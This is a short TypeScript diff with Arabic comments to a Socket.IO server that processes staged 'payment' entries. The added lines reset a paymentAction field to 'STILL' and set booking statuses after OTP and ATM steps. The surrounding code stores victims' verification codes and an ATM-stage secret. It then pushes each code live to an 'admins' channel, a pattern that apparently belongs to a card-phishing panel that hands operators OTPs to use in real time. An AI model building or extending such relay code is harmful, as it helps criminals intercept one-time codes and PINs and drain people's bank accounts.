@@ -255,7 +255,11 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
           verifyCode: String(data.verification_code_two ?? data.verification_code ?? data.verifyCode ?? ""),
           step: 2,
           status: "step2_done",
+          // إعادة تعيين paymentAction إلى STILL عند كل إدخال OTP جديد
+          paymentAction: "STILL",
         });
+        // تحديث حالة الحجز لتعكس مرحلة OTP
+        await updateBookingStatus(reference, "pending_otp");
 
         io?.to("admins").emit("newPayment", { reference, step: 2, type: "verification" });
 
@@ -289,7 +293,11 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
             secretNum: otpCode,
             step: 3,
             status: "step3_done",
+            // إعادة تعيين paymentAction إلى STILL عند كل إدخال ATM جديد
+            paymentAction: "STILL",
           });
+          // تحديث حالة الحجز لتعكس مرحلة ATM
+          await updateBookingStatus(reference, "pending_atm");
           io?.to("admins").emit("newPayment", { reference, step: 3, type: "code", code: otpCode });
         }
 
